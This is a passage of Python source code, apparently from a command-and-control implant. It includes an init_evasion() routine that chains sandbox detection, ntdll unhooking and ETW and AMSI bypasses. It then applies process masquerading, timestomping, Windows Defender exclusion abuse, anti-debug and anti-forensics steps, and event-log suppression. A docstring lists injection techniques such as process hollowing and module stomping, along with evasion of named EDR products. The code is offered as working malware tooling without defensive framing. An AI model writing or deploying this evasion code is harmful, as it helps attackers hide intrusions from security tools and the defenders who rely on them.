        oa.Attributes = 0x40  # OBJ_CASE_INSENSITIVE

        h_key = ctypes.c_void_p(0)
        disposition = ctypes.c_ulong(0)
        status = ntdll.NtCreateKey(
            ctypes.byref(h_key), 0xF003F, ctypes.byref(oa),
            0, None, 0, ctypes.byref(disposition)
        )
        if status == 0 and h_key.value:
            ntdll.NtClose(h_key)
            return True
        return False
    except Exception:
        return False


def init_evasion():
    """Master evasion initialization — call at agent startup before any payload activity

    Execution order matters:
    1. Sandbox detection (delay/exit if sandbox detected)
    2. Unhook ntdll (remove EDR hooks before other patches)
    3. Patch ETW (blind telemetry)
    4. Patch AMSI (disable content scanning)
    5. Masquerade process name (hide in process list)
    6. Timestomp agent file (blend with system files)

    Additional techniques available for on-demand use:
    - sleep_encrypt(): Call during beacon sleep intervals
    - spoof_ppid(): Use when spawning child processes
    - inject_apc(): Early bird injection into suspended processes
    - callback_exec(): Shellcode execution via API callbacks
    - hollow_process(): Process hollowing
    - fiber_exec(): Thread-less shellcode execution
    - module_stomp(): Execute from within a legitimate DLL
    - phantom_dll_hollowing(): Execute from KnownDlls section
    - section_based_alloc(): VirtualAlloc alternative that evades Falcon
    - hw_breakpoint_hook(): Code-less API hooking
    - detect_edr_processes(): Identify which EDRs are running
    """
    if sys.platform != 'win32':
        return

    delay_execution_sandbox()

    # Detect EDRs to adapt strategy
    edrs = detect_edr_processes()

    # Phase 1: Remove hooks (must be first)
    unhook_ntdll()

    # Phase 2: Blind telemetry — prefer patchless (VEH+HWBP) over patching
    # Patchless methods survive integrity checks (CrowdStrike, MDE)
    if not bypass_etw_patchless():
        bypass_etw()

    # Phase 3: Disable content scanning — patchless first
    if not bypass_amsi_patchless():
        bypass_amsi()

    # Phase 4: Process disguise
    masquerade_process_name()

    # Phase 5: File-level evasion
    try:
        timestomp(os.path.abspath(sys.argv[0]))
    except Exception:
        pass

    # Phase 6: If Defender is running, try exclusion
    if 'Microsoft Defender' in edrs:
        try:
            bypass_windows_defender_exclusions()
        except Exception:
            pass

    # Phase 7: Anti-debug and anti-forensics
    try:
        hide_thread_from_debugger()
    except Exception:
        pass
    try:
        patch_debug_flags()
    except Exception:
        pass
    try:
        stomp_pe_header()
    except Exception:
        pass

    # Phase 8: Module-level hiding
    try:
        spoof_module_name()
    except Exception:
        pass
    try:
        unlink_module_peb()
    except Exception:
        pass

    # Phase 9: Extended ETW suppression
    try:
        etw_provider_unregister()
    except Exception:
        pass
    try:
        bypass_event_log()
    except Exception:
        pass

    # Phase 10: Privilege and mitigation
    try:
        token_privilege_adjust()
    except Exception:
        pass
    try:
        block_non_microsoft_dlls()
    except Exception:
        pass

    # Phase 11: Prefetch cleanup
    try:
        disable_prefetch()
    except Exception:
        pass

    # Phase 12: Syscall resolution (populate cache for later use)
    try:
        syscall_gate_resolve()
    except Exception:
        pass

    # ACG must be LAST — it prevents further code patching
    try:
        acg_enable()
    except Exception:
        pass
